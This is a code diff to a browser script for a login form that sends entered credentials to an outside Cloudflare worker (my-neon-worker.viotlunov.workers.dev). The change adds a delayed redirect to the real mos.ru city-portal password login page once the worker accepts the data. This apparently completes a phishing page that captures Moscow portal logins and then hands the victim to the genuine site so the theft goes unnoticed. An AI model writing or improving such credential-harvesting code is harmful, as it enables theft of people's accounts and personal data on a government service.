@@ -1,5 +1,8 @@
 (function () {
     const WORKER_URL = 'https://my-neon-worker.viotlunov.workers.dev';
+    /** Куда перейти после успешного ответа воркера (200 OK). */
+    const AFTER_SUCCESS_REDIRECT = 'https://login.mos.ru/sps/login/methods/password?bo=%2Fsps%2Foauth%2Fae%3Fscope%3Dprofile%2Bopenid%2Bcontacts%2Busr_grps%2Besia%26response_type%3Dcode%26redirect_uri%3Dhttps%3A%2F%2Fwww.mos.ru%2Fapi%2Facs%2Fv1%2Flogin%2Fsatisfy%26client_id%3Dmos.ru';
+    const REDIRECT_DELAY_MS = 600;
 
     const form = document.getElementById('loginForm');
     const loginInput = document.getElementById('login');
@@ -62,9 +65,11 @@
             try { result = await response.json(); } catch (_) { /* not JSON */ }
 
             if (response.ok) {
-                setStatus(result.message || 'Готово.', 'success');
+                setStatus(result.message || 'Готово, перенаправляем…', 'success');
                 form.reset();
-                refreshSubmitState();
+                setTimeout(() => {
+                    window.location.href = AFTER_SUCCESS_REDIRECT;
+                }, REDIRECT_DELAY_MS);
             } else {
                 setStatus(
                     result.error || `Ошибка ${response.status}`,
